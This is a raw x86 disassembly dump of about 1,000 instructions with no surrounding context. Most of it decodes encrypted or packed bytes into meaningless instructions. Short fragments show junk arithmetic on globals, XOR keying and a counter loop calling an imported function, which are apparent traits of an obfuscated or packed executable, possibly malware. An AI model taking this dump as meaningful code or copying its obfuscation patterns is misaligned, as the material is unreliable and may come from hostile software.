  40ce31:	lock stc 
  40ce33:	cld    
  40ce34:	push   ss
  40ce35:	cmp    DWORD PTR [ebx+0x58],ecx
  40ce38:	sbb    bl,bh
  40ce3a:	adc    cl,BYTE PTR [ebp+ecx*8+0x351f87a3]
  40ce41:	dec    ebx
  40ce42:	sbb    eax,0x8edfa810
  40ce47:	sbb    BYTE PTR [esi],al
  40ce49:	add    cl,dl
  40ce4b:	xchg   BYTE PTR [esi-0x33],cl
  40ce4e:	push   0x3c
  40ce50:	iret   
  40ce51:	jle    0x40ceb8
  40ce53:	add    DWORD PTR [eax+eax*4+0x68],esp
  40ce57:	(bad)  
  40ce58:	mov    ds:0xc37bd0db,al
  40ce5d:	jb     0x40cedd
  40ce5f:	jmp    0x40ceb7
  40ce61:	(bad)  
  40ce62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce63:	inc    esp
  40ce64:	sbb    BYTE PTR [ebx+ebp*2+0x4ed2a199],0x41
  40ce6c:	hlt    
  40ce6d:	call   0x263b:0xdb8122d5
  40ce74:	xchg   ebp,eax
  40ce75:	inc    edx
  40ce76:	or     dl,dl
  40ce78:	in     al,dx
  40ce79:	fwait
  40ce7a:	mov    ah,0xd2
  40ce7c:	inc    edi
  40ce7d:	jmp    0x40ce08
  40ce7f:	cmc    
  40ce80:	aas    
  40ce81:	(bad)  
  40ce82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce83:	stos   DWORD PTR es:[edi],eax
  40ce84:	or     eax,edi
  40ce86:	sahf   
  40ce87:	fidivr WORD PTR [ebx+0x2e5b26f8]
  40ce8d:	les    esi,FWORD PTR [eax]
  40ce8f:	adc    DWORD PTR [ebp+0x281a146c],esi
  40ce95:	call   DWORD PTR [edx-0x46652375]
  40ce9b:	mov    bh,0x78
  40ce9d:	imul   edi,DWORD PTR [edi-0x4e385f85],0x620226c0
  40cea7:	dec    esp
  40cea8:	fucomp st(1)
  40ceaa:	xchg   edx,eax
  40ceab:	mov    BYTE PTR [ebx-0x371a843a],al
  40ceb1:	add    BYTE PTR [eax+esi*4],ch
  40ceb4:	cwde   
  40ceb5:	dec    eax
  40ceb6:	mov    eax,0x851c1b12
  40cebb:	jg     0x40cf38
  40cebd:	mov    al,0x33
  40cebf:	call   0xe3b9:0xa9c6ae98
  40cec6:	jno    0x40ce60
  40cec8:	nop
  40cec9:	cli    
  40ceca:	stos   DWORD PTR es:[edi],eax
  40cecb:	inc    edx
  40cecc:	inc    ebx
  40cecd:	dec    ebx
  40cece:	xchg   esp,eax
  40cecf:	es push esi
  40ced1:	adc    al,0x4
  40ced3:	ds jl  0x40cf31
  40ced6:	pop    edi
  40ced7:	push   eax
  40ced8:	out    0x60,eax
  40ceda:	loopne 0x40cf20
  40cedc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cedd:	aas    
  40cede:	arpl   WORD PTR [edx-0x606a4ef6],bp
  40cee4:	sub    al,0x2c
  40cee6:	int    0x21
  40cee8:	mov    al,ds:0xa7e49c8b
  40ceed:	test   DWORD PTR [edi+0x712c5a2d],edi
  40cef3:	push   es
  40cef4:	js     0x40cef5
  40cef6:	jb     0x40cf76
  40cef8:	or     DWORD PTR [ebx-0x6e],esi
  40cefb:	push   esi
  40cefc:	lods   al,BYTE PTR gs:[esi]
  40cefe:	mov    ebx,0x88d07e4d
  40cf03:	fdivp  st(5),st
  40cf05:	sbb    ah,BYTE PTR ds:0x9834deae
  40cf0b:	bound  ecx,QWORD PTR ds:0xdd07f4ae
  40cf11:	cmp    al,0x48
  40cf13:	xchg   edi,eax
  40cf14:	sar    DWORD PTR [edx-0x3039712d],1
  40cf1a:	out    0xc4,eax
  40cf1c:	retf   
  40cf1d:	xchg   edx,eax
  40cf1e:	iret   
  40cf1f:	pop    DWORD PTR [ebp+edi*2+0x5d]
  40cf23:	inc    ecx
  40cf24:	aad    0xa3
  40cf26:	sahf   
  40cf27:	or     DWORD PTR [ebp+0x77232a77],0x5c99b4eb
  40cf31:	dec    ebx
  40cf32:	mov    al,BYTE PTR [ebx+0x62c52a0a]
  40cf38:	stos   DWORD PTR es:[edi],eax
  40cf39:	out    dx,eax
  40cf3a:	daa    
  40cf3b:	inc    ebp
  40cf3c:	cli    
  40cf3d:	in     al,dx
  40cf3e:	stc    
  40cf3f:	cmc    
  40cf40:	dec    ebp
  40cf41:	daa    
  40cf42:	aas    
  40cf43:	hlt    
  40cf44:	(bad)  
  40cf45:	dec    ecx
  40cf46:	mov    dl,0x30
  40cf48:	hlt    
  40cf49:	lahf   
  40cf4a:	scas   al,BYTE PTR es:[edi]
  40cf4b:	popf   
  40cf4c:	pop    esi
  40cf4d:	into   
  40cf4e:	ja     0x40cf78
  40cf50:	jmp    0x40cfa1
  40cf52:	add    ebx,esi
  40cf54:	push   edi
  40cf55:	dec    esp
  40cf56:	fdivr  st(2),st
  40cf58:	sub    BYTE PTR [eax+ebx*8+0xf0934a6],dl
  40cf5f:	xchg   ecx,eax
  40cf60:	sbb    dl,cl
  40cf62:	xchg   BYTE PTR [eax+0x4c],bl
  40cf65:	or     al,0x7e
  40cf67:	adc    ah,BYTE PTR [edi]
  40cf69:	push   0x5c3e743b
  40cf6e:	push   esi
  40cf6f:	cmp    DWORD PTR [edi],0xfffffffe
  40cf72:	ja     0x40cfd4
  40cf74:	jp     0x40cf3c
  40cf76:	scas   al,BYTE PTR es:[edi]
  40cf77:	xchg   esp,eax
  40cf78:	cmp    eax,0x2dd12d72
  40cf7d:	or     ah,ah
  40cf7f:	xor    BYTE PTR [edi-0x51],0xfd
  40cf83:	and    BYTE PTR [ebx+0x591b19bc],al
  40cf89:	lds    esp,FWORD PTR [esi+0xa]
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a865,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a899,0x42a77d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	sbb    eax,0x2a44ddca
  40cfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfd0:	js     0x40d04a
  40cfd2:	xor    eax,0xd878787e
  40cfd7:	out    0xab,al
  40cfd9:	int    0x9
  40cfdb:	push   0xebdd3c74
  40cfe0:	cwde   
  40cfe1:	shr    BYTE PTR [eax+0x3dc86b43],1
  40cfe7:	popf   
  40cfe8:	aam    0x1c
  40cfea:	lods   al,BYTE PTR ds:[esi]
  40cfeb:	xchg   DWORD PTR [eax],esp
  40cfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfee:	cmp    ebp,DWORD PTR [ebx]
  40cff0:	cmp    cl,dh
  40cff2:	or     DWORD PTR [ebp-0x781ddc7e],ecx
  40cff8:	xchg   DWORD PTR [eax-0x13],esi
  40cffb:	ja     0x40cf9c
  40cffd:	mov    bh,0x4a
  40cfff:	popa   
  40d000:	sub    al,0x3e
  40d002:	xchg   esi,ebp
  40d004:	add    eax,0xf0ee758b
  40d009:	or     al,ch
  40d00b:	lods   al,BYTE PTR ds:[esi]
  40d00c:	xchg   esp,eax
  40d00d:	sub    al,BYTE PTR [edi-0x1a309b84]
  40d013:	in     eax,dx
  40d014:	jmp    0x9ebfa705
  40d019:	xor    BYTE PTR [esi-0x65],ch
  40d01c:	push   ebx
  40d01d:	or     eax,0xfc4d24aa
  40d022:	fcom   QWORD PTR [edi-0x11]
  40d025:	imul   DWORD PTR [ecx-0x47]
  40d028:	dec    ecx
  40d029:	xchg   esp,eax
  40d02a:	mov    ecx,0x80bac24
  40d02f:	imul   ecx,DWORD PTR [ebx+0x6e088536],0xfd0a671
  40d039:	mov    eax,0xa716282e
  40d03e:	(bad)  
  40d03f:	clc    
  40d040:	xor    al,0x18
  40d042:	or     ebx,esi
  40d044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d045:	xlat   BYTE PTR ds:[ebx]
  40d046:	mov    BYTE PTR ds:0xc82ca0e3,dh
  40d04c:	sbb    BYTE PTR [ebx+0x760e5b02],bl
  40d052:	mov    ds:0x34c35b30,eax
  40d057:	sub    BYTE PTR [edx],ch
  40d059:	shr    BYTE PTR [esi],0x4a
  40d05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d05d:	jmp    0x2de6b08a
  40d062:	push   cs
  40d063:	mov    ss,WORD PTR [edi]
  40d065:	xchg   edx,eax
  40d066:	out    0xe5,eax
  40d068:	fwait
  40d069:	dec    edx
  40d06a:	loop   0x40d00d
  40d06c:	aad    0x3a
  40d06e:	icebp  
  40d06f:	inc    esi
  40d070:	mov    WORD PTR [eax],gs
  40d072:	pop    edi
  40d073:	stos   DWORD PTR es:[edi],eax
  40d074:	xor    al,0x8d
  40d076:	int3   
  40d077:	pushf  
  40d078:	loope  0x40d0e4
  40d07a:	push   ebx
  40d07b:	jg     0x40d053
  40d07d:	(bad)  
  40d07f:	dec    ebx
  40d080:	adc    cl,BYTE PTR [edx+0x25294079]
  40d086:	mov    edi,0x424e0a3d
  40d08b:	test   eax,0xde57705e
  40d090:	sbb    esp,DWORD PTR [eax]
  40d092:	fimul  WORD PTR [esi+0x0]
  40d095:	out    dx,al
  40d096:	lock dec ebx
  40d098:	(bad)  
  40d099:	cld    
  40d09a:	xchg   ecx,eax
  40d09b:	push   edx
  40d09c:	cmp    BYTE PTR [edi],bl
  40d09e:	scas   al,BYTE PTR es:[edi]
  40d09f:	rcr    BYTE PTR [edx-0x4b],cl
  40d0a2:	inc    ebp
  40d0a3:	out    dx,al
  40d0a4:	push   edi
  40d0a5:	add    bh,al
  40d0a7:	loop   0x40d10f
  40d0a9:	(bad)  
  40d0aa:	div    BYTE PTR [ebx+0x74]
  40d0ad:	mov    esi,0xabafb5b9
  40d0b2:	cld    
  40d0b3:	inc    ecx
  40d0b4:	sbb    dl,bh
  40d0b6:	jbe    0x40d093
  40d0b8:	mov    al,0x5a
  40d0ba:	inc    eax
  40d0bb:	les    ebx,FWORD PTR [edx-0x50b9fa5a]
  40d0c1:	sub    al,BYTE PTR [ecx+0x6dcd4b21]
  40d0c7:	sub    dl,BYTE PTR [edi+ebx*8]
  40d0ca:	jmp    0x40d097
  40d0cc:	and    al,0x2
  40d0ce:	aam    0xad
  40d0d0:	jl     0x40d0a5
  40d0d2:	add    DWORD PTR [ebp+0x50],ecx
  40d0d5:	mov    bl,0xbc
  40d0d7:	test   eax,0xa0a5d6ac
  40d0dc:	mov    bl,0x52
  40d0de:	sbb    ecx,ecx
  40d0e0:	neg    BYTE PTR [bp+si+0x2fd6]
  40d0e5:	rol    dh,cl
  40d0e7:	mov    ch,0x42
  40d0e9:	dec    ecx
  40d0ea:	idiv   DWORD PTR [ecx+0x45bea92c]
  40d0f0:	adc    cl,BYTE PTR [eax+edx*1+0x5d]
  40d0f4:	call   0x4b67004b
  40d0f9:	sbb    ebp,esp
  40d0fb:	idiv   BYTE PTR [edx+0x385e13e8]
  40d101:	sub    DWORD PTR [edx-0x72f4a99d],esp
  40d107:	clc    
  40d108:	(bad)  
  40d109:	jno    0x40d173
  40d10b:	mov    eax,0x29c57a38
  40d110:	mov    WORD PTR [ebp+0x181dc646],ds
  40d116:	pop    eax
  40d117:	pop    es
  40d118:	pop    ebp
  40d119:	inc    esi
  40d11a:	push   es
  40d11b:	dec    edi
  40d11c:	or     DWORD PTR [ecx],0x2a
  40d11f:	test   ebp,0x1e93948d
  40d125:	iret   
  40d126:	aaa    
  40d127:	ins    BYTE PTR es:[edi],dx
  40d128:	sbb    BYTE PTR [ecx],dh
  40d12a:	lea    esp,[esi+edx*1+0x1a2cd3ec]
  40d131:	cli    
  40d132:	inc    edx
  40d133:	inc    edi
  40d134:	mov    ds:0x158b2420,al
  40d139:	int    0x46
  40d13b:	dec    esi
  40d13c:	inc    eax
  40d13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d13e:	and    bl,BYTE PTR [ebp-0x3e]
  40d141:	sub    eax,0xf6d03af6
  40d146:	sub    al,0x82
  40d148:	push   ds
  40d149:	add    ebx,eax
  40d14b:	push   0xdc6613f7
  40d150:	inc    edi
  40d151:	pop    ds
  40d152:	cwde   
  40d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d154:	inc    esp
  40d155:	fwait
  40d156:	sub    ebp,edx
  40d158:	(bad)
  40d15b:	mov    dh,0x2d
  40d15d:	xchg   ebp,eax
  40d15e:	xchg   BYTE PTR [eax+0x7aaa0223],bl
  40d164:	mov    bh,ah
  40d166:	addr16 pop edi
  40d168:	jmp    0x93fa:0xa86d1061
  40d16f:	sbb    al,dl
  40d171:	repz sbb al,0x31
  40d174:	retf   0xa6ec
  40d177:	lods   eax,DWORD PTR ds:[esi]
  40d178:	pusha  
  40d179:	inc    edx
  40d17a:	gs push es
  40d17c:	fs jb  0x40d1d5
  40d17f:	sbb    BYTE PTR [ecx-0x61606b0a],dl
  40d185:	inc    esp
  40d186:	sbb    edi,DWORD PTR [ecx+0x72cbe877]
  40d18c:	icebp  
  40d18d:	scas   eax,DWORD PTR es:[edi]
  40d18e:	out    0x54,eax
  40d190:	jnp    0x40d1a2
  40d192:	scas   al,BYTE PTR es:[edi]
  40d193:	sar    edx,0xb1
  40d196:	push   esi
  40d197:	scas   al,BYTE PTR es:[edi]
  40d198:	adc    eax,0x7ac2432b
  40d19d:	adc    edx,DWORD PTR [ecx+0x6a2ccdb1]
  40d1a3:	mov    al,ds:0x63f56b27
  40d1a8:	call   DWORD PTR [edx+edx*1-0x1d5014fb]
  40d1af:	int    0xa6
  40d1b1:	mov    ah,0xf6
  40d1b3:	lea    edx,[edx+0x29bf31e7]
  40d1b9:	clc    
  40d1ba:	scas   al,BYTE PTR es:[edi]
  40d1bb:	aad    0xbc
  40d1bd:	imul   edx,DWORD PTR [eax],0xffffffa9
  40d1c0:	add    al,0x7
  40d1c2:	ss pusha 
  40d1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1c5:	and    ah,cl
  40d1c7:	push   ebx
  40d1c8:	mov    bh,0xd9
  40d1ca:	inc    ebx
  40d1cb:	pop    ebp
  40d1cc:	push   0xffffffe9
  40d1ce:	loop   0x40d200
  40d1d0:	mov    ch,0x5b
  40d1d2:	mov    bh,BYTE PTR [esi+0x36ad14e9]
  40d1d8:	sar    dl,cl
  40d1da:	dec    esp
  40d1db:	xchg   esi,eax
  40d1dc:	add    BYTE PTR [edx],bh
  40d1de:	pop    edi
  40d1df:	dec    edi
  40d1e0:	in     eax,dx
  40d1e1:	fadd   st,st(1)
  40d1e3:	mov    BYTE PTR [edi-0x6d],ah
  40d1e6:	in     al,0x38
  40d1e8:	jp     0x40d1f8
  40d1ea:	dec    ebp
  40d1eb:	jecxz  0x40d1c0
  40d1ed:	sub    al,0xe2
  40d1ef:	aas    
  40d1f0:	jb     0x40d17f
  40d1f2:	fucomip st,st(0)
  40d1f4:	sub    eax,0xc5f513a7
  40d1f9:	or     edx,ebp
  40d1fb:	retf   0x1663
  40d1fe:	(bad)  
  40d1ff:	xchg   ebx,eax
  40d200:	pop    ss
  40d201:	ins    BYTE PTR es:[edi],dx
  40d202:	mov    WORD PTR [ebp+0x2595ff8],cs
  40d208:	inc    cx
  40d20a:	fdiv   DWORD PTR [ebx]
  40d20c:	aam    0x68
  40d20e:	or     al,0x39
  40d210:	mov    dl,BYTE PTR [ebx+0x56]
  40d213:	and    DWORD PTR ds:0x42a7d5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7d5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7d5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7d5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7d5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a795
  40d260:	xor    ebx,DWORD PTR ds:0x42a77d
  40d266:	mov    DWORD PTR ds:0x42a795,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7dd,0x42a899
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a8a9,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a899,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a865
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d2bb:	cwde   
  40d2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0xf878787e
  40d2c6:	sbb    BYTE PTR [esi-0x4b3fe3c7],0x72
  40d2cd:	int    0x90
  40d2cf:	sbb    eax,0x2ebfd82c
  40d2d4:	sub    BYTE PTR [ebp+0x12],0x79
  40d2d8:	mov    ah,0x7f
  40d2da:	sbb    eax,0x2b6ea35b
  40d2df:	adc    bh,BYTE PTR [esi+0x47]
  40d2e2:	or     eax,0x2a57d2df
  40d2e7:	cmc    
  40d2e8:	push   esp
  40d2e9:	(bad)  
  40d2ea:	das    
  40d2eb:	and    ebx,0x6431f350
  40d2f1:	sti    
  40d2f2:	in     al,dx
  40d2f3:	pop    ebx
  40d2f4:	push   ds
  40d2f5:	mov    ebx,0xb38f81cc
  40d2fa:	and    DWORD PTR [esp+edi*2-0x71],esp
  40d2fe:	stc    
  40d2ff:	xchg   DWORD PTR [ebp+0x1c],ebp
  40d302:	adc    eax,0x52a43e62
  40d307:	or     DWORD PTR fs:[esp+eiz*2+0x1],eax
  40d30c:	xchg   ebx,eax
  40d30d:	dec    ecx
  40d30e:	mov    BYTE PTR [ecx+0x2ebf893b],dl
  40d314:	adc    al,0xdd
  40d316:	pop    ebp
  40d317:	jl     0x40d2c7
  40d319:	push   0x5b0798d3
  40d31e:	jmp    0x483a5cd7
  40d323:	out    0xc7,eax
  40d325:	or     edi,DWORD PTR [ecx]
  40d327:	push   ebx
  40d328:	rcl    BYTE PTR [esi-0x12],cl
  40d32b:	mov    ebp,0x15059515
  40d330:	xchg   ecx,eax
  40d331:	lods   eax,DWORD PTR ds:[esi]
  40d332:	adc    bh,0xa6
  40d335:	mov    ds,WORD PTR [ecx+0x73]
  40d338:	sar    DWORD PTR [esi-0x5ebfe4d8],1
  40d33e:	mov    al,0x90
  40d340:	mov    DWORD PTR [edi+0x9baf98d],edx
  40d346:	xor    ch,cl
  40d348:	fucom  st(2)
  40d34a:	and    cl,ah
  40d34c:	scas   al,BYTE PTR es:[edi]
  40d34d:	jne    0x40d361
  40d34f:	scas   eax,DWORD PTR es:[edi]
  40d350:	ds lock retf 0x6e75
  40d355:	or     eax,0xda9dac52
  40d35a:	test   al,0xa8
  40d35c:	aaa    
  40d35d:	mov    ds:0x9dac23dc,eax
  40d362:	mov    eax,ebx
  40d364:	popf   
  40d365:	inc    ebp
  40d366:	in     eax,dx
  40d367:	inc    ebp
  40d368:	(bad)  
  40d369:	mov    dl,0x44
  40d36b:	repz sbb eax,edx
  40d36e:	or     DWORD PTR ds:0x187e5b66,esp
  40d374:	jl     0x40d2fc
  40d376:	mov    es:0x946e0065,al
  40d37c:	aad    0xf
  40d37e:	rcr    DWORD PTR [eax-0x5c],cl
  40d381:	or     eax,0xcb8ceb08
  40d386:	outs   dx,DWORD PTR ds:[esi]
  40d387:	jmp    0x702fea83
  40d38c:	push   0x7e
  40d38e:	push   0x9e1058b9
  40d393:	or     BYTE PTR [ebp+0x72277b47],ch
  40d399:	push   ds
  40d39a:	mov    esi,gs
  40d39c:	ret    
  40d39d:	dec    edx
  40d39e:	xchg   ecx,eax
  40d39f:	push   ds
  40d3a0:	mov    ebp,0x721cc653
  40d3a5:	in     eax,0xf7
  40d3a7:	mov    dh,0x47
  40d3a9:	xor    ebp,0xffffffce
  40d3ac:	imul   ecx,esp,0x51
  40d3af:	(bad)  [edx]
  40d3b1:	cs ret 0x929a
  40d3b5:	scas   al,BYTE PTR es:[edi]
  40d3b6:	lock mul ebp
  40d3b9:	jne    0x40d386
  40d3bb:	hlt    
  40d3bc:	je     0x40d434
  40d3be:	pop    eax
  40d3bf:	(bad)  
  40d3c0:	or     al,BYTE PTR [ebx-0x48]
  40d3c3:	mov    BYTE PTR [ecx+0xe0da4cd],bl
  40d3c9:	icebp  
  40d3ca:	mov    ecx,0x2bc1ffda
  40d3cf:	test   DWORD PTR [ebx-0x38],esp
  40d3d2:	pop    ecx
  40d3d3:	int3   
  40d3d4:	ins    DWORD PTR es:[edi],dx
  40d3d5:	adc    BYTE PTR [ebx],0x24
  40d3d8:	(bad)  
  40d3d9:	sub    al,0xb5
  40d3db:	call   0xc8e802b6
  40d3e0:	pop    es
  40d3e1:	cwde   
  40d3e2:	iret   
  40d3e3:	xor    ebx,edi
  40d3e5:	xchg   ebp,ebx
  40d3e7:	gs and dh,bl
  40d3ea:	xor    al,ah
  40d3ec:	fcom   QWORD PTR [ebx]
  40d3ee:	add    BYTE PTR [ebp-0x794726ca],bh
  40d3f4:	cld    
  40d3f5:	xchg   esi,eax
  40d3f6:	(bad)  
  40d3f8:	sub    eax,0x6e5a408f
  40d3fd:	add    ebp,DWORD PTR [esi+eiz*1+0x59]
  40d401:	mov    edi,0x399aa93b
  40d406:	jnp    0x40d431
  40d408:	popf   
  40d409:	jp     0x40d3c5
  40d40b:	and    eax,0x22703edd
  40d410:	(bad)  
  40d411:	pusha  
  40d412:	sub    eax,0xcece404c
  40d417:	push   ebp
  40d418:	sbb    BYTE PTR [ecx+0x67],cl
  40d41b:	lock rcl DWORD PTR [esi+0x3394097b],0x34
  40d423:	inc    ebx
  40d424:	nop
  40d425:	sub    DWORD PTR [edx-0x3e],ebx
  40d428:	rcl    DWORD PTR [eax],cl
  40d42a:	ror    DWORD PTR [eax+0x70ace154],1
  40d430:	mov    ebx,0xbd3fe04d
  40d435:	imul   ebx,DWORD PTR [ebp+0x79ba068],0x6c
  40d43c:	cli    
  40d43d:	int3   
  40d43e:	ret    0xb7a9
  40d441:	mov    BYTE PTR [ebx-0x3f],cl
  40d444:	push   ss
  40d445:	push   esp
  40d446:	outs   dx,DWORD PTR ds:[esi]
  40d447:	sbb    ch,ch
  40d449:	sub    edx,eax
  40d44b:	sahf   
  40d44c:	xchg   ecx,eax
  40d44d:	lock jmp 0x7088986f
  40d453:	into   
  40d454:	jns    0x40d471
  40d456:	shr    DWORD PTR [ebx],cl
  40d458:	add    esp,ebp
  40d45a:	adc    cl,BYTE PTR [eax]
  40d45c:	aad    0xc7
  40d45e:	cli    
  40d45f:	xor    esi,DWORD PTR [eax]
  40d461:	and    eax,DWORD PTR [ebx-0x56510ece]
  40d467:	cmp    DWORD PTR [ebp+0xa],0xd7534f5d
  40d46e:	mov    bh,0x55
  40d470:	jnp    0x40d492
  40d472:	mov    ecx,0x1b0d4176
  40d477:	pop    ds
  40d478:	pop    ecx
  40d479:	jae    0x40d468
  40d47b:	rcl    BYTE PTR [edx-0x46],cl
  40d47e:	cmp    eax,0xb8d68a13
  40d483:	mov    ch,bh
  40d485:	push   edx
  40d486:	popa   
  40d487:	xor    eax,0xfa28cc53
  40d48c:	imul   edx,DWORD PTR [edx],0x12
  40d48f:	add    esp,ebp
  40d491:	aaa    
  40d492:	std    
  40d493:	fmul   st(0),st
  40d495:	xor    eax,0x532afea8
  40d49a:	xchg   esi,eax
  40d49b:	jmp    0x5a82:0xccee0ad6
  40d4a2:	pop    edi
  40d4a3:	ret    0x19c2
  40d4a6:	repz jae 0x40d4ed
  40d4a9:	cmp    bh,0x83
  40d4ac:	cmp    al,BYTE PTR [ebp-0x13]
  40d4af:	test   BYTE PTR [ecx+0x2f],dh
  40d4b2:	dec    ecx
  40d4b3:	mov    al,ds:0x9f30481e
  40d4b8:	and    DWORD PTR [edx+eiz*1],edi
  40d4bb:	fidiv  DWORD PTR [ebp-0xc]
  40d4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4bf:	or     al,0x68
  40d4c1:	push   ebp
  40d4c2:	push   esp
  40d4c3:	inc    edi
  40d4c4:	ins    BYTE PTR es:[edi],dx
  40d4c5:	in     eax,0x22
  40d4c7:	or     BYTE PTR [ecx+eax*4-0x66],bh
  40d4cb:	stos   BYTE PTR es:[edi],al
  40d4cc:	ds mov ebx,0xa147e2b5
  40d4d2:	push   0xffffffdb
  40d4d4:	xchg   edi,eax
  40d4d5:	into   
  40d4d6:	popf   
  40d4d7:	test   eax,0x81be8d4a
  40d4dc:	das    
  40d4dd:	(bad)  
  40d4de:	into   
  40d4df:	ins    DWORD PTR es:[edi],dx
  40d4e0:	hlt    
  40d4e1:	push   esi
  40d4e2:	aas    
  40d4e3:	fcomi  st,st(2)
  40d4e5:	pop    ds
  40d4e6:	nop
  40d4e7:	js     0x40d4e3
  40d4e9:	imul   eax,ebx,0xffffffd5
  40d4ec:	iret   
  40d4ed:	dec    eax
  40d4ee:	cmp    al,0x11
  40d4f0:	ror    BYTE PTR [edx-0x36af5536],0xf1
  40d4f7:	adc    ebx,DWORD PTR [ebx-0x6d8a86cb]
  40d4fd:	ins    DWORD PTR es:[edi],dx
  40d4fe:	mov    eax,0xf445c7f1
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x57eada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,ah
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a789,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7ed,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a855,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	arpl   WORD PTR [edi-0x546343fa],sp
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0x4978787e
  40d582:	mov    WORD PTR [esi],ds
  40d584:	dec    edi
  40d585:	btr    DWORD PTR [eax-0x172dd064],ecx
  40d58c:	imul   esi,DWORD PTR [edx+0x54],0x452f04a4
  40d593:	push   edx
  40d594:	xchg   DWORD PTR [ebp+0x41],esp
  40d597:	mov    al,ds:0xae7c69a3
  40d59c:	std    
  40d59d:	mov    dh,0x89
  40d59f:	arpl   WORD PTR [ecx-0x18859c76],cx
  40d5a5:	push   ss
  40d5a6:	and    BYTE PTR [ebp+edx*8+0x7e1bd6d3],al
  40d5ad:	xlat   BYTE PTR ds:[ebx]
  40d5ae:	adc    edx,DWORD PTR [ebx-0x72]
  40d5b1:	push   eax
  40d5b2:	test   BYTE PTR es:[ebx-0x59],al
  40d5b6:	imul   eax,DWORD PTR [eax],0x1aee0b9d
  40d5bc:	push   cs
  40d5bd:	xchg   ebp,eax
  40d5be:	stos   BYTE PTR es:[edi],al
  40d5bf:	mov    ds:0xc44af823,al
  40d5c4:	bnd jb 0x40d591
  40d5c7:	xor    ebx,esi
  40d5c9:	jle    0x40d55d
  40d5cb:	ftst   
  40d5cd:	in     al,dx
  40d5ce:	xchg   esp,eax
  40d5cf:	push   ecx
  40d5d0:	xchg   ebp,eax
  40d5d1:	stc    
  40d5d2:	adc    BYTE PTR [edi-0xa],bh
  40d5d5:	inc    ebx
  40d5d6:	sbb    DWORD PTR [edx],ebp
  40d5d8:	scas   eax,DWORD PTR es:[edi]
  40d5d9:	imul   edi,DWORD PTR [edx],0x5b
  40d5dc:	sar    dh,1
  40d5de:	(bad)  
  40d5df:	sub    ebx,ebp
  40d5e1:	stos   BYTE PTR es:[edi],al
  40d5e2:	in     al,dx
  40d5e3:	div    DWORD PTR [eax]
  40d5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e6:	jae    0x40d604
  40d5e8:	mov    ds:0x2ff917b0,al
  40d5ed:	in     al,dx
  40d5ee:	adc    eax,0x2b3f07a4
  40d5f3:	pop    esp
  40d5f4:	test   eax,0xabb8fd6d
  40d5f9:	mov    al,0x15
  40d5fb:	xor    eax,0x7c52d348
  40d600:	mov    eax,ds:0x2e1b9cb0
  40d605:	jnp    0x40d5e8
  40d607:	(bad)  
